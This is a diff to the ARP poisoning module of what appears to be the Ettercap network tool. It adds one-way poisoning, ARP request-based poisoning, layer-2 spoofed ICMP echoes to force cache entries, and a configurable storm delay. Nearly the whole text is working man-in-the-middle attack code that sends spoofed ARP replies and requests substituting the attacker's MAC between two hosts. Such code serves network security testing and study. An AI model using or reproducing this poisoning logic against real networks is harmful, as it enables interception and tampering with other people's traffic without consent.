@@ -17,7 +17,7 @@
     along with this program; if not, write to the Free Software
     Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
 
-    $Id: ec_arp_poisoning.c,v 1.15 2003/11/05 10:12:26 lordnaga Exp $
+    $Id: ec_arp_poisoning.c,v 1.16 2003/11/10 22:46:24 alor Exp $
 */
 
 #include <ec.h>
@@ -37,6 +37,8 @@
  */
 LIST_HEAD(, hosts_list) group_one_head;
 LIST_HEAD(, hosts_list) group_two_head;
+
+static int poison_oneway;
 
 /* protos */
 
@@ -73,16 +75,19 @@ static void arp_poisoning_start(char *args)
 {
    int ret;
   
-   
+   poison_oneway = 0; 
+     
    DEBUG_MSG("arp_poisoning_start");
    
    /* check the parameter */
-   if (!strcasecmp(args, "remote")) {
+   if (strcasestr(args, "remote")) {
       /* 
        * allow sniffing of remote host even 
        * if the target is local (used for gw)
        */
       GBL_OPTIONS->remote = 1;
+   } else if (strcasestr(args, "oneway")) {
+      poison_oneway = 1; 
    } else if (strcmp(args, "")) {
       USER_MSG("FATAL: ARP poisoning: paramenter incorrect.\n");
       return;
@@ -149,9 +154,20 @@ static void arp_poisoning_stop(void)
                continue;
             
             /* the effective poisoning packets */
-            send_arp(ARPOP_REPLY, &g2->ip, g2->mac, &g1->ip, g1->mac); 
-            send_arp(ARPOP_REPLY, &g1->ip, g1->mac, &g2->ip, g2->mac); 
+            if (GBL_CONF->arp_poison_reply) {
+               send_arp(ARPOP_REPLY, &g2->ip, g2->mac, &g1->ip, g1->mac); 
+               /* only send from T2 to T1 */
+               if (!poison_oneway)
+                  send_arp(ARPOP_REPLY, &g1->ip, g1->mac, &g2->ip, g2->mac); 
+            }
+            if (GBL_CONF->arp_poison_request) {
+               send_arp(ARPOP_REQUEST, &g2->ip, g2->mac, &g1->ip, g1->mac); 
+               /* only send from T2 to T1 */
+               if (!poison_oneway)
+                  send_arp(ARPOP_REQUEST, &g1->ip, g1->mac, &g2->ip, g2->mac); 
+            }
             
+            usleep(GBL_CONF->arp_storm_delay * 1000);
          }
       }
       
@@ -204,15 +220,29 @@ EC_THREAD_FUNC(arp_poisoner)
              * send the spoofed ICMP echo request 
              * to force the arp entry in the cache
              */
-            if (i == 1) {
-               send_icmp_echo(ICMP_ECHO, &g2->ip, &g1->ip);
-               send_icmp_echo(ICMP_ECHO, &g1->ip, &g2->ip);
+            if (i == 1 && GBL_CONF->arp_poison_icmp) {
+               send_L2_icmp_echo(ICMP_ECHO, &g2->ip, &g1->ip, g1->mac);
+               /* only send from T2 to T1 */
+               if (!poison_oneway)
+                  send_L2_icmp_echo(ICMP_ECHO, &g1->ip, &g2->ip, g2->mac);
             }
             
             /* the effective poisoning packets */
-            send_arp(ARPOP_REPLY, &g2->ip, GBL_IFACE->mac, &g1->ip, g1->mac); 
-            send_arp(ARPOP_REPLY, &g1->ip, GBL_IFACE->mac, &g2->ip, g2->mac); 
+            if (GBL_CONF->arp_poison_reply) {
+               send_arp(ARPOP_REPLY, &g2->ip, GBL_IFACE->mac, &g1->ip, g1->mac); 
+               /* only send from T2 to T1 */
+               if (!poison_oneway)
+                  send_arp(ARPOP_REPLY, &g1->ip, GBL_IFACE->mac, &g2->ip, g2->mac); 
+            }
+            /* request attack */
+            if (GBL_CONF->arp_poison_request) {
+               send_arp(ARPOP_REQUEST, &g2->ip, GBL_IFACE->mac, &g1->ip, g1->mac); 
+               /* only send from T2 to T1 */
+               if (!poison_oneway)
+                  send_arp(ARPOP_REQUEST, &g1->ip, GBL_IFACE->mac, &g2->ip, g2->mac); 
+            }
            
+            usleep(GBL_CONF->arp_storm_delay * 1000);
          }
       }
       
